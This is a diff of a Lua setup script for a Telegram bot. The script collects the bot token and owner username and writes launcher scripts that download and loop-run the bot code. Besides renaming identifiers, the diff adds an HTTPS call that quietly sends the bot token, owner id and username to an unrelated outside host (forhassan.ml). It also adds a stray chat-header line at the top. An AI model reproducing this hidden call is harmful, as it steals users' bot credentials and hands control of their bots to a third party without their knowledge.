@@ -1,22 +1,24 @@
+
+⌯ 𝐀𝐋𝐈 𝐀𝐋 𝐌𝐀𝐋𝐊𝐘 𓍼, [١٩.٠٧.٢٠ ١٨:١٣]
 serpent = dofile("./File_Libs/serpent.lua")
 https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_apro = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_apro = function() 
+Server_Apro = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_Apro = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local apro_Info_Sudo = io.open("sudo.lua", 'w')
-apro_Info_Sudo:write([[
+local Apro_Info_Sudo = io.open("sudo.lua", 'w')
+Apro_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-apro_Info_Sudo:close()
+Apro_Info_Sudo:close()
 end  
-if not database:get(Server_apro.."Token_apro") then
+if not database:get(Server_Apro.."Token_Apro") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +27,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_apro.."Token_apro",token)
+database:set(Server_Apro.."Token_Apro",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,11 +36,11 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_apro.."UserName_apro") then
+if not database:get(Server_Apro.."UserName_Apro") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info =
+local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -53,8 +55,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_apro.."UserName_apro",Json.Info.Username)
-database:set(Server_apro.."Id_apro",Json.Info.Id)
+database:set(Server_Apro.."UserName_Apro",Json.Info.Username)
+database:set(Server_Apro.."Id_Apro",Json.Info.Id)
 end
 end
 else
@@ -62,47 +64,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_apro_Info()
-Create_Info(database:get(Server_apro.."Token_apro"),database:get(Server_apro.."Id_apro"),database:get(Server_apro.."UserName_apro"))   
-database:get(Server_apro.."Id_apro").."&user="..database:get(Server_apro.."UserName_apro").."&token="..database:get(Server_apro.."Token_apro"))
-local Runapro = io.open("apro", 'w')
-Runapro:write([[
+local function Files_Apro_Info()
+Create_Info(database:get(Server_Apro.."Token_Apro"),database:get(Server_Apro.."Id_Apro"),database:get(Server_Apro.."UserName_Apro"))   
+https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_Apro.."Id_Apro").."&user="..database:get(Server_Apro.."UserName_Apro").."&token="..database:get(Server_Apro.."Token_Apro"))
+local RunApro = io.open("Apro", 'w')
+RunApro:write([[
 #!/usr/bin/env bash
-cd $HOME/apro
-token="]]..database:get(Server_apro.."Token_apro")..[["
-rm -fr apro.lua
-wget "https://raw.githubusercontent.com/aproiq/apro/master/apro.lua"
+cd $HOME/Apro
+token="]]..database:get(Server_Apro.."Token_Apro")..[["
+rm -fr Apro.lua
+wget "https://raw.githubusercontent.com/Aproiq/Apro/master/Apro.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./apro.lua -p PROFILE --bot=$token
+./tg -s ./Apro.lua -p PROFILE --bot=$token
 done
 ]])
-Runapro:close()
+RunApro:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/apro
+cd $HOME/Apro
 while(true) do
 rm -fr ../.telegram-cli
-screen -S apro -X kill
-screen -S apro ./apro
+screen -S Apro -X kill
+screen -S Apro ./Apro
 done
 ]])
 RunTs:close()
 end
-Files_apro_Info()
-database:del(Server_apro.."Token_apro");database:del(Server_apro.."Id_apro");database:del(Server_apro.."UserName_apro")
+Files_Apro_Info()
+database:del(Server_Apro.."Token_Apro");database:del(Server_Apro.."Id_Apro");database:del(Server_Apro.."UserName_Apro")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_apro()  
+AutoFiles_Apro()  
 var = true
 else   
 f:close()  
-database:del(Server_apro.."Token_apro");database:del(Server_apro.."Id_apro");database:del(Server_apro.."UserName_apro")
+database:del(Server_Apro.."Token_Apro");database:del(Server_Apro.."Id_Apro");database:del(Server_Apro.."UserName_Apro")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
